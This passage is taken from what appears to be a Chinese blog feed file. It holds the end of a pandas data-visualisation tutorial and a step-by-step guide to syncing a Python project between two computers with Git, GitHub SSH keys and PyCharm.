class="token punctuation">(</span>bins<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Hist Data Visualization'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Value'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Frequency'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 绘制散点图</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'x'</span><span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'y'</span><span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Scatter Data Visualization'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 绘制箱线图</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'A'</span><span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'B'</span><span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">.</span>box<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Box Data Visualization'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Value'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 绘制饼图</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span>labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">]</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">,</span> index<span class="token operator">=</span>labels<span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autopct<span class="token operator">=</span><span class="token string">'%.2f'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Pie Chart Data Visualization'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="8-总结与进阶"><a href="#8-总结与进阶" class="headerlink" title="8. 总结与进阶"></a><strong>8. 总结与进阶</strong></h3><p><strong>8.1 常用技巧</strong></p><p>在实际使用 pandas 时，以下一些技巧可能会很有帮助：</p><ul><li><p><strong>链式操作：</strong> 可以将多个操作链接在一起，提高代码的可读性：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> <span class="token punctuation">(</span>    pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'data.csv'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span>dropna<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'city'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>使用 query() 方法：</strong> 可以用更简洁的语法进行数据筛选：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">'age &gt; 30 and city == "New York"'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用 isin() 方法：</strong> 可以检查 Series 或 DataFrame 中的元素是否在给定的列表中：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cities <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">]</span>    df<span class="token punctuation">[</span>df<span class="token punctuation">[</span><span class="token string">'city'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isin<span class="token punctuation">(</span>cities<span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>使用 assign() 方法：</strong> 可以添加新的列，同时保留原始 DataFrame：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df <span class="token operator">=</span> df<span class="token punctuation">.</span>assign<span class="token punctuation">(</span>age_plus_ten <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用 pipe() 方法：</strong> 可以将 DataFrame 传递给一系列函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">clean_data</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> df<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_age</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> df<span class="token punctuation">.</span>assign<span class="token punctuation">(</span>age_plus_ten <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span>clean_data<span class="token punctuation">)</span><span class="token punctuation">.</span>pipe<span class="token punctuation">(</span>add_age<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>8.2 学习资源</strong></p><ul><li><strong>官方文档：</strong> <a href="https://www.google.com/url?sa=E&amp;q=https://pandas.pydata.org/docs/">pandas documentation</a><ul><li>这是学习 pandas 最权威的资源，包含了所有函数、方法的详细说明和示例。</li></ul></li><li><strong>在线教程：</strong><ul><li><a href="https://www.google.com/url?sa=E&amp;q=https://pandas.pydata.org/docs/user_guide/10min.html">10 Minutes to pandas</a>: 一个快速上手 pandas 的教程。</li><li><a href="https://www.google.com/url?sa=E&amp;q=https://pandas.pydata.org/pandas-docs/stable/user_guide/cookbook.html">Pandas Cookbook</a>: 包含各种常见的数据处理问题的解决方案。</li></ul></li><li><strong>书籍：</strong><ul><li>“Python for Data Analysis” by Wes McKinney： pandas 的作者写的书，是学习 pandas 的经典之作。</li></ul></li><li><strong>实践项目：</strong><ul><li>可以尝试一些 Kaggle 上的数据分析项目，将 pandas 应用到实际问题中。</li></ul></li><li><strong>社区：</strong><ul><li>Stack Overflow：在遇到问题时，可以在 Stack Overflow 上搜索或提问。</li><li>GitHub：pandas 也是一个开源项目，可以在 GitHub 上查看源代码，参与贡献。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两台电脑使用github+pycharm同步开发</title>
      <link href="/2025/01/10/liang-tai-dian-nao-shi-yong-github-pycharm-tong-bu-kai-fa/"/>
      <url>/2025/01/10/liang-tai-dian-nao-shi-yong-github-pycharm-tong-bu-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="两台电脑使用github-pycharm同步开发"><a href="#两台电脑使用github-pycharm同步开发" class="headerlink" title="两台电脑使用github+pycharm同步开发"></a>两台电脑使用github+pycharm同步开发</h1><p>本文介绍如何在两台电脑之间通过 GitHub 和 PyCharm 实现项目的同步开发。</p><hr><h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a><strong>一、准备工作</strong></h3><h4 id="1-在两台电脑上安装必要工具"><a href="#1-在两台电脑上安装必要工具" class="headerlink" title="1. 在两台电脑上安装必要工具"></a><strong>1. 在两台电脑上安装必要工具</strong></h4><ul><li><strong>Git</strong>：下载并安装 <a href="https://git-scm.com/">Git</a>。</li><li><strong>PyCharm</strong>：下载并安装 <a href="https://www.jetbrains.com/pycharm/">PyCharm</a>。</li><li><strong>GitHub 账号</strong>：确保已经注册并拥有 GitHub 账号。</li></ul><h4 id="2-配置-Git-环境"><a href="#2-配置-Git-环境" class="headerlink" title="2. 配置 Git 环境"></a><strong>2. 配置 Git 环境</strong></h4><p>在两台电脑上分别配置 Git：</p><ol><li><p><strong>设置用户名和邮箱</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"你的用户名"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"你的邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>生成 SSH 密钥</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> ed25519 <span class="token parameter variable">-C</span> <span class="token string">"你的邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>按提示生成密钥（存储在 <code>~/.ssh/id_ed25519</code>）。</p></li><li><p>使用以下命令查看并复制公钥内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_ed25519.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>登录 GitHub，进入 <strong>Settings &gt; SSH and GPG keys</strong>，点击 <strong>New SSH key</strong>，将公钥粘贴并保存。</p></li></ul></li><li><p><strong>测试连接</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-T</span> git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回：</p><pre class="line-numbers language-vbnet" data-language="vbnet"><code class="language-vbnet">Hi <span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span><span class="token comment">! You've successfully authenticated, but GitHub does not provide shell access.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示配置成功。</p></li></ol><hr><h3 id="二、创建远程仓库并上传项目"><a href="#二、创建远程仓库并上传项目" class="headerlink" title="二、创建远程仓库并上传项目"></a><strong>二、创建远程仓库并上传项目</strong></h3><h4 id="1-创建远程仓库"><a href="#1-创建远程仓库" class="headerlink" title="1. 创建远程仓库"></a><strong>1. 创建远程仓库</strong></h4><ol><li>登录 GitHub，点击右上角的 <strong>+</strong> &gt; <strong>New repository</strong>。</li><li>填写仓库名称（例如 <code>my_project</code>），选择 <strong>Public</strong> 或 <strong>Private</strong>，然后点击 <strong>Create repository</strong>。</li></ol><h4 id="2-将本地项目上传到远程仓库"><a href="#2-将本地项目上传到远程仓库" class="headerlink" title="2. 将本地项目上传到远程仓库"></a><strong>2. 将本地项目上传到远程仓库</strong></h4><p>在已存在的项目目录中初始化 Git，并推送到远程仓库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /path/to/your/project<span class="token function">git</span> init  <span class="token comment"># 初始化</span><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span>  <span class="token comment"># 提交所有文件到暂存区</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"Initial commit"</span>  <span class="token comment"># 提交到当前分支</span><span class="token function">git</span> branch <span class="token parameter variable">-M</span> main <span class="token comment"># 将当前分支重命名为main，github默认分支为main</span><span class="token function">git</span> remote <span class="token function">add</span> origin git@github.com:<span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span>/my_project.git  <span class="token comment"># 绑定远程仓库</span><span class="token function">git</span> push <span class="token parameter variable">-u</span> origin main <span class="token comment"># 将 main 分支推送到远程仓库，并建立本地与远程分支的关联，添加 -u 参数后，本地的 main 分支会与远程的 main 分支关联起来。这样，后续执行 git pull 或 git push 时，不需要再指定分支名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="三、在两台电脑上同步项目"><a href="#三、在两台电脑上同步项目" class="headerlink" title="三、在两台电脑上同步项目"></a><strong>三、在两台电脑上同步项目</strong></h3><h4 id="电脑-A-操作"><a href="#电脑-A-操作" class="headerlink" title="电脑 A 操作"></a><strong>电脑 A 操作</strong></h4><ol><li><p><strong>克隆远程仓库</strong>： 如果电脑 A 尚未有项目代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@github.com:<span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span>/my_project.git<span class="token builtin class-name">cd</span> my_project<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果电脑 A 已有代码并已推送到远程仓库，则跳过此步骤。</p></li><li><p><strong>用 PyCharm 打开项目</strong>：</p><ul><li>打开 PyCharm，点击 <strong>File &gt; Open</strong>，选择项目目录。</li></ul></li></ol><h4 id="电脑-B-操作"><a href="#电脑-B-操作" class="headerlink" title="电脑 B 操作"></a><strong>电脑 B 操作</strong></h4><ol><li><p><strong>克隆远程仓库</strong>： 在电脑 B 的终端中运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@github.com:<span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span>/my_project.git<span class="token builtin class-name">cd</span> my_project<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>用 PyCharm 打开项目</strong>：</p><ul><li>打开 PyCharm，点击 <strong>File &gt; Open</strong>，选择项目目录。</li></ul></li></ol><hr><h3 id="四、日常开发流程"><a href="#四、日常开发流程" class="headerlink" title="四、日常开发流程"></a><strong>四、日常开发流程</strong></h3><h4 id="1-在电脑-A-或-B-上修改代码"><a href="#1-在电脑-A-或-B-上修改代码" class="headerlink" title="1. 在电脑 A 或 B 上修改代码"></a><strong>1. 在电脑 A 或 B 上修改代码</strong></h4><ol><li><p>使用 PyCharm 编辑代码。</p></li><li><p>在终端或 PyCharm 的 Git 工具窗口中提交更改：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"描述本次更改的内容"</span><span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="2-在另一台电脑同步代码"><a href="#2-在另一台电脑同步代码" class="headerlink" title="2. 在另一台电脑同步代码"></a><strong>2. 在另一台电脑同步代码</strong></h4><p>在另一台电脑上拉取最新代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后继续开发。</p><hr><h3 id="五、解决冲突"><a href="#五、解决冲突" class="headerlink" title="五、解决冲突"></a><strong>五、解决冲突</strong></h3><p>如果两台电脑同时修改了同一个文件并提交，可能会出现冲突。解决方法如下：</p><ol><li><p><strong>拉取代码时提示冲突</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Git 会提示冲突的文件。</p></li><li><p><strong>手动解决冲突</strong>： 打开冲突文件，按照以下格式解决冲突：</p><pre class="line-numbers language-none"><code class="language-none">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD你的修改=======另一台电脑的修改&gt;&gt;&gt;&gt;&gt;&gt;&gt; commit-hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改为期望的代码并保存。</p></li><li><p><strong>标记冲突已解决并提交</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"解决冲突"</span><span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><hr><h3 id="六、PyCharm-中内置-Git-工具的使用"><a href="#六、PyCharm-中内置-Git-工具的使用" class="headerlink" title="六、PyCharm 中内置 Git 工具的使用"></a><strong>六、PyCharm 中内置 Git 工具的使用</strong></h3><ol><li><strong>提交代码</strong>：<ul><li>在 PyCharm 界面右上角，点击 <strong>Commit</strong>。</li><li>勾选修改的文件，填写提交信息，然后点击 <strong>Commit</strong> 或 <strong>Commit and Push</strong>。</li></ul></li><li><strong>拉取代码</strong>：<ul><li>点击 <strong>Git &gt; Pull</strong>，选择远程分支，点击 <strong>OK</strong>。</li></ul></li><li><strong>查看分支和日志</strong>：<ul><li>点击 <strong>Git &gt; Log</strong>，查看提交历史和分支结构。</li></ul></li></ol><hr><h3 id="七、注意事项"><a href="#七、注意事项" class="headerlink" title="七、注意事项"></a><strong>七、注意事项</strong></h3><ol><li><strong>保持代码同步</strong>：每次在另一台电脑开发前，先执行 <code>git pull</code> 拉取最新代码。</li><li><strong>频繁提交</strong>：尽量将每次修改后的小更新提交到远程仓库，避免产生冲突。</li><li><strong>多人协作时注意分支管理</strong>：可以为不同功能创建分支，完成后再合并到主分支。</li></ol><h3 id="八、分支管理"><a href="#八、分支管理" class="headerlink" title="八、分支管理"></a><strong>八、分支管理</strong></h3><p>当开发新功能或进行实验时，可以使用分支来避免影响主分支。</p><h4 id="1-创建和切换分支"><a href="#1-创建和切换分支" class="headerlink" title="1. 创建和切换分支"></a><strong>1. 创建和切换分支</strong></h4><ul><li><p>创建新分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>切换到新分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或直接创建并切换：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout <span class="token parameter variable">-b</span> feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="2-合并分支"><a href="#2-合并分支" class="headerlink" title="2. 合并分支"></a><strong>2. 合并分支</strong></h4><ul><li><p>切换到主分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>合并新功能分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> merge feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="3-删除分支"><a href="#3-删除分支" class="headerlink" title="3. 删除分支"></a><strong>3. 删除分支</strong></h4><ul><li><p>删除本地分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch <span class="token parameter variable">-d</span> feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>删除远程分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin <span class="token parameter variable">--delete</span> feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h3 id="九、处理多人协作的冲突"><a href="#九、处理多人协作的冲突" class="headerlink" title="九、处理多人协作的冲突"></a><strong>九、处理多人协作的冲突</strong></h3><p>如果你在两台电脑之外，还与其他人协作开发，可以通过以下方式优化工作流。</p><h4 id="1-定期拉取最新代码"><a href="#1-定期拉取最新代码" class="headerlink" title="1. 定期拉取最新代码"></a><strong>1. 定期拉取最新代码</strong></h4><p>在本地开发前，确保代码是最新的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-使用-rebase-整理提交历史"><a href="#2-使用-rebase-整理提交历史" class="headerlink" title="2. 使用 rebase 整理提交历史"></a><strong>2. 使用 <code>rebase</code> 整理提交历史</strong></h4><p>在同步远程分支时，你可以选择 <code>rebase</code> 方式，使提交历史更加整洁：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull <span class="token parameter variable">--rebase</span> origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-使用标签管理版本"><a href="#3-使用标签管理版本" class="headerlink" title="3. 使用标签管理版本"></a><strong>3. 使用标签管理版本</strong></h4><p>当一个功能开发完成后，可以添加一个标签：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> tag <span class="token parameter variable">-a</span> v1.0 <span class="token parameter variable">-m</span> <span class="token string">"Version 1.0 release"</span><span class="token function">git</span> push origin v1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="十、PyCharm-的一些高级-Git-功能"><a href="#十、PyCharm-的一些高级-Git-功能" class="headerlink" title="十、PyCharm 的一些高级 Git 功能"></a><strong>十、PyCharm 的一些高级 Git 功能</strong></h3><h4 id="1-可视化查看分支"><a href="#1-可视化查看分支" class="headerlink" title="1. 可视化查看分支"></a><strong>1. 可视化查看分支</strong></h4><ul><li>在 PyCharm 界面右下角，点击 <strong>Git 分支名称</strong>，可以查看和切换分支。</li><li>打开 <strong>Git &gt; Log</strong>，可以看到分支结构图和提交历史。</li></ul><h4 id="2-解决冲突"><a href="#2-解决冲突" class="headerlink" title="2. 解决冲突"></a><strong>2. 解决冲突</strong></h4><p>当拉取代码遇到冲突时，PyCharm 提供了图形化工具：</p><ol><li>点击 <strong>Merge Conflicts</strong> 提示框。</li><li>使用 PyCharm 的三栏界面，直观地合并冲突。</li><li>合并完成后，保存并提交。</li></ol><h4 id="3-使用变基（Rebase）"><a href="#3-使用变基（Rebase）" class="headerlink" title="3. 使用变基（Rebase）"></a><strong>3. 使用变基（Rebase）</strong></h4><ul><li>在 PyCharm 中，选择 <strong>VCS &gt; Git &gt; Rebase</strong>，可以直观地重新整理提交。</li></ul><hr><h3 id="十一、优化开发体验"><a href="#十一、优化开发体验" class="headerlink" title="十一、优化开发体验"></a><strong>十一、优化开发体验</strong></h3><h4 id="1-配置-gitignore"><a href="#1-配置-gitignore" class="headerlink" title="1. 配置 .gitignore"></a><strong>1. 配置 <code>.gitignore</code></strong></h4><p>避免将不必要的文件推送到远程仓库。比如 Python 项目常用的 <code>.gitignore</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">__pycache__/*.pyc*.pyo*.log.idea/.vscode/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 <code>.gitignore</code> 文件添加到项目根目录，然后提交：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> .gitignore<span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"Add .gitignore"</span><span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-提高拉取速度"><a href="#2-提高拉取速度" class="headerlink" title="2. 提高拉取速度"></a><strong>2. 提高拉取速度</strong></h4><p>如果仓库较大，可以通过浅克隆（仅克隆最近的提交历史）加快速度：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span> <span class="token number">1</span> git@github.com:<span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span>/my_project.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-使用-SSH-配置多个远程地址"><a href="#3-使用-SSH-配置多个远程地址" class="headerlink" title="3. 使用 SSH 配置多个远程地址"></a><strong>3. 使用 SSH 配置多个远程地址</strong></h4><p>如果有多个远程仓库，可以配置多个 <code>remote</code> 地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token function">add</span> backup git@github.com:<span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span>/my_project_backup.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="十二、代码评审（Code-Review）和协作工具"><a href="#十二、代码评审（Code-Review）和协作工具" class="headerlink" title="十二、代码评审（Code Review）和协作工具"></a><strong>十二、代码评审（Code Review）和协作工具</strong></h3><p>如果需要团队协作，可以用 GitHub 的 Pull Request 功能：</p><ol><li><p>创建一个新分支进行开发。</p></li><li><p>推送分支到远程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push <span class="token parameter variable">-u</span> origin feature-branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 GitHub 上发起 **Pull Request (PR)**，让团队成员进行代码审查。</p></li><li><p>审查通过后，合并分支。</p></li></ol><hr><h3 id="十三、备份与恢复操作"><a href="#十三、备份与恢复操作" class="headerlink" title="十三、备份与恢复操作"></a><strong>十三、备份与恢复操作</strong></h3><h4 id="1-创建仓库副本（Fork）"><a href="#1-创建仓库副本（Fork）" class="headerlink" title="1. 创建仓库副本（Fork）"></a><strong>1. 创建仓库副本（Fork）</strong></h4><ul><li>如果你想备份项目或创建自己的分支，可以直接在 GitHub 上点击 <strong>Fork</strong>。</li></ul><h4 id="2-恢复代码"><a href="#2-恢复代码" class="headerlink" title="2. 恢复代码"></a><strong>2. 恢复代码</strong></h4><ul><li><p>如果需要回滚到某次提交：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> <span class="token operator">&lt;</span>commit-id<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看历史提交记录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><hr><h3 id="十四、自动化工作流"><a href="#十四、自动化工作流" class="headerlink" title="十四、自动化工作流"></a><strong>十四、自动化工作流</strong></h3><h4 id="1-使用-GitHub-Actions-自动化任务"><a href="#1-使用-GitHub-Actions-自动化任务" class="headerlink" title="1. 使用 GitHub Actions 